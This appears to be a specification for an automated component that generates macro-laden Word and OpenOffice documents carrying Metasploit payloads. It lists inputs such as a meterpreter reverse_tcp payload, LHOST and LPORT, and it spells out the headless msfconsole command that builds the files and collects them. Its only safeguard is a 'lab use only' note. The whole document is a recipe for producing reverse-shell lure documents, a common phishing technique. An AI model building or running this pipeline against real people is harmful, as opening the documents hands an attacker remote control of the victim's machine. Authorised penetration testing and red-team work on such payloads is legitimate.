# Contract — Office/OpenOffice Document Payloads

Purpose
- Generate documents with macro-based payloads using Metasploit for Microsoft Word (Windows/macOS) and OpenOffice/LibreOffice (Windows/Linux/macOS).

Inputs
- suite_target: enum (ms_word_windows, ms_word_mac, openoffice_windows, openoffice_linux)
- payload: enum (e.g., windows/meterpreter/reverse_tcp, osx/*, python/* depending on target)
- lhost: IPv4/hostname
- lport: 1..65535
- output_name: string (base name without extension)

Outputs
- artifacts:
  - output/<output_name>.(doc|odt|zip depending on module)
  - logs/build.log
  - status.json

Process (Headless)
1) Compose msfconsole resource script for chosen module:
   - office_word_macro for Word targets
   - openoffice_document_macro for OpenOffice targets (with proper target id)
2) Execute msfconsole -x 'use <module>; set PAYLOAD ...; set LHOST ...; set LPORT ...; run; exit -y'.
3) Collect output from ~/.msf4/local to task output.
4) Emit status.json with artifact names and checksums.

Preconditions
- msfconsole available and functional

Failure Cases
- Incompatible payload for target suite
- Module execution failure
- Missing artifact in msf4 local folder

Security Notes
- Generated documents must be clearly labeled for lab use only.
- Never auto-open artifacts on orchestrator host.